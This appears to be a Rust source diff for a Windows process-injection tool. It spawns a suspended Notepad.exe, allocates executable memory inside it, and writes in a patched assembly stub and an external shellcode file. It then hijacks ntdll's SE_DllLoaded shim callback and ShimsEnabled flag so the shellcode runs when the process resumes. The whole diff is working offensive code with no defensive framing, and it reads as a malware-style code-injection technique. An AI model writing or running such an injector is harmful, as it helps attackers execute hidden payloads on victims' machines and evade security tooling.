@@ -1,18 +1,42 @@
 #![allow(non_upper_case_globals)]
-use std::{ffi::CString, mem::zeroed, ops::Add, os::raw::c_void, ptr::null_mut};
+use std::{
+    ffi::CString, intrinsics::copy_nonoverlapping, mem::zeroed, ops::Add, os::raw::c_void,
+    ptr::null_mut,
+};
 
-use windows_sys::Win32::System::{
-    Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
-    LibraryLoader::GetModuleHandleA,
-    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
-    SystemServices::IMAGE_DOS_HEADER,
-    Threading::{
-        CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
-        TerminateProcess,
+use windows_sys::Win32::{
+    Foundation::{CloseHandle, HCN_E_NETWORK_NOT_FOUND},
+    System::{
+        Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory},
+        LibraryLoader::{GetModuleHandleA, GetProcAddress},
+        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
+        SystemServices::IMAGE_DOS_HEADER,
+        Threading::{
+            CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
+            TerminateProcess,
+        },
     },
 };
 
-const STUB: &[u8] = include_bytes!("../../stub/stub.bin");
+const STUB: &[u8] = &[
+    0x48, 0x83, 0xec, 0x38, // sub rsp, 38h
+    0x33, 0xc0, // xor eax, eax
+    0x45, 0x33, 0xc9, // xor r9d, r9d
+    0x48, 0x21, 0x44, 0x24, 0x20, // and [rsp+38h+var_18], rax
+    0x48, 0xba, //
+    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, // mov rdx, 8888888888888888h
+    0xa2, // (offset: 25)
+    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, // mov ds:9999999999999999h, al
+    0x49, 0xb8, //
+    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, // mov r8, 7777777777777777h
+    0x48, 0x8d, 0x48, 0xfe, // lea rcx, [rax-2]
+    0x48, 0xb8, //
+    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, // mov rax, 6666666666666666h
+    0xff, 0xd0, // call rax
+    0x33, 0xc0, // xor eax, eax
+    0x48, 0x83, 0xc4, 0x38, // add rsp, 38h
+    0xc3, // retn
+];
 
 const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
@@ -66,18 +90,18 @@ struct CascadePattern {
 //     null_mut()
 // }
 
-// fn rotr64(value: u64, shift: u64) -> u64 {
-//     let shift = shift & 63;
-//     (value >> shift) | (value << (64 - shift))
-// }
+fn rotr64(value: u64, shift: u64) -> u64 {
+    let shift = shift & 63;
+    (value >> shift) | (value << (64 - shift))
+}
 
-// fn encode_system_ptr(ptr: *mut c_void) -> *mut c_void {
-//     unsafe {
-//         let cookie = *(0x7FFE0330 as *const u32);
-//         let encoded = rotr64(cookie as u64 ^ ptr as u64, (cookie & 0x3F) as u64);
-//         encoded as *mut c_void
-//     }
-// }
+fn encode_system_ptr(ptr: *mut c_void) -> *mut c_void {
+    unsafe {
+        let cookie = *(0x7FFE0330 as *const u32);
+        let encoded = rotr64(cookie as u64 ^ ptr as u64, (cookie & 0x3F) as u64);
+        encoded as *mut c_void
+    }
+}
 
 fn find_offset(base: *const u8, size: usize, pattern: &[u8]) -> usize {
     for i in 0..(size - pattern.len()) {
@@ -275,6 +299,19 @@ unsafe fn find_shims_enabled_address(
     null_mut()
 }
 
+fn patch_stub(stub: &mut [u8], g_value: u64, offset: usize) {
+    let g_value_bytes = g_value.to_ne_bytes();
+    stub[offset..offset + 8].copy_from_slice(&g_value_bytes);
+
+    let bytes = &stub[offset..offset + 8];
+    let patched_value = u64::from_ne_bytes(bytes.try_into().unwrap());
+
+    println!(
+        "[+] Patched stub at offset {} with value: 0x{:016X}",
+        offset, patched_value
+    );
+}
+
 fn main() {
     let proc_name = CString::new("Notepad.exe").unwrap();
     unsafe {
@@ -305,6 +342,22 @@ fn main() {
             proc_name, pi.dwProcessId
         );
 
+        let ntdll_handle = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);
+
+        // 0x9999999999999999
+        // 0x8888888888888888
+        // 0x7777777777777777
+        // 0x6666666666666666
+
+        let mut offset_address: *mut c_void = null_mut();
+        let se_dll_loaded_addr =
+            find_se_dll_loaded_address(ntdll_handle as *mut c_void, &mut offset_address);
+        println!("[+] Found SE_DllLoaded address: {:?}", se_dll_loaded_addr);
+
+        let shims_enabled_addr =
+            find_shims_enabled_address(ntdll_handle as *mut c_void, offset_address);
+        println!("[+] Found ShimsEnabled address: {:?}", shims_enabled_addr);
+
         let length = STUB.len() + SHELLCODE.len();
 
         let remote_buffer = VirtualAllocEx(
@@ -321,17 +374,27 @@ fn main() {
             return;
         }
 
-        let ntdll_handle = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);
+        println!("[+] Allocated {} bytes at {:p}", length, remote_buffer);
 
-        // 0x9999999999999999
-        // 0x8888888888888888
-        // 0x7777777777777777
-        // 0x6666666666666666
+        let mut patched_stub = STUB.to_vec();
+
+        let g_value = remote_buffer.add(STUB.len()) as u64;
+        let pattern = [0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88];
+        let offset = find_pattern(&patched_stub, &pattern).unwrap();
+        println!(
+            "[+] Found pattern 0x{} at offset: {:?}",
+            pattern
+                .iter()
+                .map(|b| format!("{:02X}", b))
+                .collect::<Vec<_>>()
+                .join(""),
+            offset
+        );
+
+        patch_stub(&mut patched_stub, g_value, offset);
 
         let pattern = [0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99];
-
-        let found_pattern = find_offset(STUB.as_ptr(), STUB.len(), &pattern);
-
+        let offset = find_pattern(&patched_stub, &pattern).unwrap();
         println!(
             "[+] Found pattern 0x{} at offset: {:?}",
             pattern
@@ -339,25 +402,13 @@ fn main() {
                 .map(|b| format!("{:02X}", b))
                 .collect::<Vec<_>>()
                 .join(""),
-            found_pattern
+            offset
         );
 
-        let pattern = [0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88];
-
-        let found_pattern = find_offset(STUB.as_ptr(), STUB.len(), &pattern);
-
-        println!(
-            "[+] Found pattern 0x{} at offset: {:?}",
-            pattern
-                .iter()
-                .map(|b| format!("{:02X}", b))
-                .collect::<Vec<_>>()
-                .join(""),
-            found_pattern
-        );
+        patch_stub(&mut patched_stub, shims_enabled_addr as u64, offset);
 
         let pattern = [0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77];
-        let found_pattern = find_offset(STUB.as_ptr(), STUB.len(), &pattern);
+        let offset = find_pattern(&patched_stub, &pattern).unwrap();
         println!(
             "[+] Found pattern 0x{} at offset: {:?}",
             pattern
@@ -365,11 +416,13 @@ fn main() {
                 .map(|b| format!("{:02X}", b))
                 .collect::<Vec<_>>()
                 .join(""),
-            found_pattern
+            offset
         );
+
+        patch_stub(&mut patched_stub, 0 as u64, offset);
 
         let pattern = [0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66];
-        let found_pattern = find_offset(STUB.as_ptr(), STUB.len(), &pattern);
+        let offset = find_pattern(&patched_stub, &pattern).unwrap();
         println!(
             "[+] Found pattern 0x{} at offset: {:?}",
             pattern
@@ -377,18 +430,84 @@ fn main() {
                 .map(|b| format!("{:02X}", b))
                 .collect::<Vec<_>>()
                 .join(""),
-            found_pattern
+            offset
         );
 
-        let mut offset_address: *mut c_void = null_mut();
-        let se_dll_loaded_addr =
-            find_se_dll_loaded_address(ntdll_handle as *mut c_void, &mut offset_address);
-        println!("[+] Found SE_DllLoaded address: {:?}", se_dll_loaded_addr);
+        let nt_queue_apc_addr =
+            GetProcAddress(ntdll_handle, "NtQueueApcThread\0".as_ptr() as *const u8).unwrap()
+                as *mut c_void;
 
-        let shims_enabled_addr =
-            find_shims_enabled_address(ntdll_handle as *mut c_void, offset_address);
-        println!("[+] Found ShimsEnabled address: {:?}", shims_enabled_addr);
+        if nt_queue_apc_addr.is_null() {
+            println!("[-] Failed to get NtQueueApcThread address");
+            TerminateProcess(pi.hProcess, 0);
+            return;
+        }
+
+        patch_stub(&mut patched_stub, nt_queue_apc_addr as u64, offset);
+
+        let mut bytes_written: usize = 0;
+        if WriteProcessMemory(
+            pi.hProcess,
+            remote_buffer,
+            patched_stub.as_ptr() as *const c_void,
+            STUB.len(),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!("[-] Failed to write stub to remote process");
+            TerminateProcess(pi.hProcess, 0);
+            return;
+        }
+
+        println!(
+            "[+] Written stub at {:p} ({} bytes)",
+            remote_buffer, bytes_written
+        );
+
+        if WriteProcessMemory(
+            pi.hProcess,
+            remote_buffer.add(STUB.len()),
+            SHELLCODE.as_ptr() as *const c_void,
+            SHELLCODE.len(),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!("[-] Failed to write to shellcode remote process");
+            TerminateProcess(pi.hProcess, 0);
+            return;
+        }
+
+        let g_value = true;
+
+        if WriteProcessMemory(
+            pi.hProcess,
+            shims_enabled_addr,
+            &g_value as *const _ as *const c_void,
+            std::mem::size_of_val(&g_value),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!("[-] Failed to write remote process");
+            TerminateProcess(pi.hProcess, 0);
+        }
+
+        let g_value = encode_system_ptr(remote_buffer);
+
+        if WriteProcessMemory(
+            pi.hProcess,
+            se_dll_loaded_addr,
+            &g_value as *const _ as *const c_void,
+            std::mem::size_of_val(&g_value),
+            &mut bytes_written,
+        ) == 0
+        {
+            println!("[-] Failed to write to remote process");
+            TerminateProcess(pi.hProcess, 0);
+        }
 
         ResumeThread(pi.hThread);
+
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
     }
 }
